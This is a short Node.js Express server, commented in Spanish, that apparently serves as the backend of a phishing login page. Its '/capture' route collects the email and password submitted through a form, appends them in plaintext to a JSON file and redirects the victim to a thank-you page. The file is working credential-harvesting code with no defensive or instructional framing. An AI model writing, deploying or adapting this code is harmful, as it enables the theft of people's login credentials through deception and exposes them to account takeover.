const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Servir archivos estáticos (HTML, CSS)
app.use(express.static(path.join(__dirname, 'public')));

// Ruta para manejar el formulario de inicio de sesión
app.post('/capture', (req, res) => {
    const { email, password } = req.body;
    const data = {
        email,
        password,
        timestamp: new Date().toISOString()
    };

    // Guardar datos en un archivo JSON
    fs.appendFile('responses.json', JSON.stringify(data, null, 2) + ',\n', (err) => {
        if (err) {
            console.error('Error guardando los datos:', err);
            res.status(500).send('Error interno del servidor');
            return;
        }
        res.redirect('/thank_you.html');
    });
});

app.listen(port, () => {
    console.log(`Servidor ejecutándose en http://localhost:${port}`);
});
